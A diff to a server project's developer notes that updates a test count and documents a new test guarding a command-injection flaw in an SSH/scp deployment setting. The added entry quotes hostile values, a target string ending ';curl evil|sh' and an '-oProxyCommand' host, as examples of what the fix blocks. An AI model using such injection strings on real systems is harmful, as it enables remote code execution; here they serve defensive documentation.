@@ -31,7 +31,7 @@ venv/bin/uvicorn main:app --host 0.0.0.0 --port 4000   # add --reload for dev
   restart for backend/alias changes. Read **only at startup**:
   `stats.enabled` and the stats/jobs DB paths.
 - **No linter or build step, and no blanket test suite** — only targeted stdlib
-  `unittest` files for the mechanisms that fail SILENTLY (see the thirty-two listed under
+  `unittest` files for the mechanisms that fail SILENTLY (see the thirty-three listed under
   `anthropic_bridge.py`): `venv/bin/python -m unittest discover -s tests -t .`.
   Everything else is verified by running the server and hitting endpoints with
   `curl` (README "Try it"), `curl localhost:4000/health` for a routing snapshot, or
@@ -579,7 +579,7 @@ they need via injected callables, staying hot-reload-safe.
   silently answer about content the model never saw (documents/PDFs). Covered by
   `test_anthropic_bridge.py` (stdlib `unittest` — a streaming tool-call bridge fails
   silently rather than crashing). `ls tests/test_*.py` is the count of record —
-  **thirty-two** files today — and each exists for that same reason: the mechanism it
+  **thirty-three** files today — and each exists for that same reason: the mechanism it
   guards fails SILENTLY, so it is named next to that mechanism above.
   `test_anthropic_bridge.py`, `test_prune_branch.py` (a
   dead-branch prune that cascades one node too far or too few surfaces as an aborted
@@ -704,6 +704,12 @@ they need via injected callables, staying hot-reload-safe.
   with 403 for a POST and, for a GET, a page whose same-origin *Continue* link runs it, so
   links from chat or mail still work one click later. Every /ui response carries
   `_UI_SEC_HEADERS` (no framing, nosniff) and the cookie is `samesite=strict`).
+  `test_voice_ship_targets.py` (`voice_ref_hosts` is the one setting that reaches a
+  command line — `ssh <host> "mkdir -p <dir>"` + `scp`, as root on prod — and the only
+  check was "dir starts with /": `root@box:/x;curl evil|sh` ran remotely, a host
+  `-oProxyCommand=…` locally, and both look like a normal ship. `main.parse_voice_target`
+  holds host and dirs to plain characters BEFORE any process is spawned, and the argv
+  puts `--` before the host and `shlex.quote`s the remote dir).
   Run them all with `python -m unittest discover -s tests -t .` (no runner dependency).
 - **`openai_image_bridge.py`** — pure request/response plumbing for the OpenAI
   image shims (`multipart_list`, `parse_size`, `coerce_scalar`, `images_uploads`
